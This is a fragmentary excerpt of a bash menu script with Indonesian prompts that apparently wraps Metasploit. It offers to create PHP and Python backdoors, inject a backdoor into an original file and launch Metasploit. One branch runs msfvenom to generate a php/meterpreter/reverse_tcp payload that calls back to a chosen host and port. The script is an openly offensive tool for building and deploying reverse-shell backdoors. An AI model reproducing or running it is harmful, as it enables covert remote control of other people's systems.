...
sleep 0.01
echo $hi"[5]$ku buat backdoor script php$me (new)$ku    "
sleep 0.01
echo $hi"[6]$ku buat backdoor script python$me (new)$ku "
sleep 0.01
echo $hi"[7]$ku injecksi backdoor original$me (new)$ku  "
sleep 0.01
echo $hi"[8]$ku aktifkan database                       "
sleep 0.01
echo $hi"[9]$ku jalankan metasploit                     "
sleep 0.01
echo $hi"[0]$ku exit                         "
sleep 0.01
echo $hi
...
clear
	...
	clear
		...
		echo $hi"[+] GENERATE BACKDOOR!!"
		sleep 2
		msfvenom -p php/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o /sdcard/$sc.php
		echo
		echo "selesai... :)"
		sleep 0.01
		echo "--------------------------------------------------------"
...
do
	...
	echo $hi"[3]$ku Eksekusi Backdoor PHP$me (new)$cy"
	echo $hi"[0]$ku Kembali "
	echo $cy
	read -p "pilih : " pi
		if [ $pi = "1" ];
		then
